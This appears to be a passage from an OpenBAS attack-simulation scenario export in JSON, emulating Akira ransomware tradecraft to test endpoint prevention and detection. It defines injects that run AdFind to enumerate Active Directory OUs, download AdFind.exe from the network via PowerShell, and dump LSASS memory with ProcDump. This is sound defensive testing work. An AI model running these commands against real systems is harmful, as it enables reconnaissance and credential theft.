{
  "export_version" : 1,
  "scenario_information" : {
    "scenario_id" : "139ef31c-d211-4e23-81e9-ebd5834321ad",
    "scenario_name" : "Akira Ransomware",
    "scenario_description" : "",
    "scenario_subtitle" : "",
    "scenario_category" : "attack-scenario",
    "scenario_main_focus" : "endpoint-protection",
    "scenario_severity" : "high",
    "scenario_message_header" : "SIMULATION HEADER",
    "scenario_message_footer" : "SIMULATION FOOTER",
    "scenario_mail_from" : "animation-testing@filigran.cloud",
    "scenario_tags" : [ "d524d1db-7ab6-4737-b45f-aab997c9f612" ],
    "scenario_documents" : [ ]
  },
  "scenario_teams" : [ ],
  "scenario_objectives" : null,
  "scenario_users" : [ ],
  "scenario_organizations" : [ ],
  "scenario_injects" : [ {
    "inject_id" : "c67d1288-fc54-4e14-ac69-4d5a18939edb",
    "inject_title" : "Adfind - Enumerate Active Directory OUs",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "optional_args" : null,
      "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_path" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ {
      "dependency_relationship" : {
        "inject_parent_id" : "f6247c01-a2cb-4832-bf0e-cd9e05b35223",
        "inject_children_id" : "c67d1288-fc54-4e14-ac69-4d5a18939edb"
      },
      "dependency_condition" : {
        "mode" : "and",
        "conditions" : [ {
          "key" : "Execution",
          "value" : true,
          "operator" : "eq"
        } ]
      },
      "dependency_created_at" : "2025-07-04T15:49:37.048825Z",
      "dependency_updated_at" : "2025-07-04T15:49:37.048837Z"
    } ],
    "inject_depends_duration" : 300,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Adfind - Enumerate Active Directory OUs",
          "fr" : "Adfind - Enumerate Active Directory OUs"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "optional_args",
          "label" : "optional_args",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : null,
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "48fa6c0e-1281-4df4-9d91-a35c7cc8cfbb",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "48fa6c0e-1281-4df4-9d91-a35c7cc8cfbb",
      "injector_contract_labels" : {
        "en" : "Adfind - Enumerate Active Directory OUs",
        "fr" : "Adfind - Enumerate Active Directory OUs"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Adfind - Enumerate Active Directory OUs\",\"fr\":\"Adfind - Enumerate Active Directory OUs\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"optional_args\",\"label\":\"optional_args\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":null,\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/AdFind.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/AdFind.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/AdFind.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\AdFind_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/AdFind.exe\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"48fa6c0e-1281-4df4-9d91-a35c7cc8cfbb\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "a1016608-5319-4323-bef5-b44fbbca88cb",
        "payload_type" : "Command",
        "payload_name" : "Adfind - Enumerate Active Directory OUs",
        "payload_description" : "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "f72b5ad5-2c64-4788-9ca3-fe33bd84465a",
          "attack_pattern_name" : "Domain Trust Discovery",
          "attack_pattern_description" : "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
          "attack_pattern_external_id" : "T1482",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
            "phase_external_id" : "TA0007",
            "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
            "phase_name" : "Discovery",
            "phase_shortname" : "discovery",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "phase_order" : 8
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "optional_args",
          "default_value" : null,
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/AdFind.exe",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory (split-path \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\"\n",
          "check_command" : "if (Test-Path \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\") {exit 0} else {exit 1}\n",
          "description" : "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n"
        }, {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory (split-path \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/../ExternalPayloads/AdFind.exe\" -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\"",
          "check_command" : "if (Test-Path '#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}') {exit 0} else {exit 1}",
          "description" : ""
        } ],
        "payload_external_id" : "d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:45.174261Z",
        "payload_updated_at" : "2025-07-03T14:50:41.763991Z",
        "command_executor" : "cmd",
        "command_content" : "\"#{PathToAtomicsFolder\\__\\ExternalPayloads\\AdFind_exe_atomicredteam_path}\" -f (objectcategory=organizationalUnit) #{optional_args}\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:45.187412Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:45.187413Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "f72b5ad5-2c64-4788-9ca3-fe33bd84465a",
        "attack_pattern_name" : "Domain Trust Discovery",
        "attack_pattern_description" : "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
        "attack_pattern_external_id" : "T1482",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
          "phase_external_id" : "TA0007",
          "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
          "phase_name" : "Discovery",
          "phase_shortname" : "discovery",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
          "phase_order" : 8
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "2db2bb88-c24b-4c6a-b0b2-36735db5b17e",
    "inject_title" : "Dump LSASS.exe Memory using ProcDump",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : false,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "output_file" : "C:\\Windows\\Temp\\lsass_dump.dmp",
      "procdump_exe" : "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe",
      "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_zip_path" : "./ExternalPayloads/../ExternalPayloads/Procdump.zip",
      "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_path" : "./ExternalPayloads/../ExternalPayloads/Procdump",
      "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump\\Procdump_exe_path" : "./ExternalPayloads/../ExternalPayloads/Procdump/Procdump.exe"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 540,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Dump LSASS.exe Memory using ProcDump",
          "fr" : "Dump LSASS.exe Memory using ProcDump"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "output_file",
          "label" : "output_file",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "C:\\Windows\\Temp\\lsass_dump.dmp",
          "type" : "text"
        }, {
          "key" : "procdump_exe",
          "label" : "procdump_exe",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_zip_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Procdump_zip_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
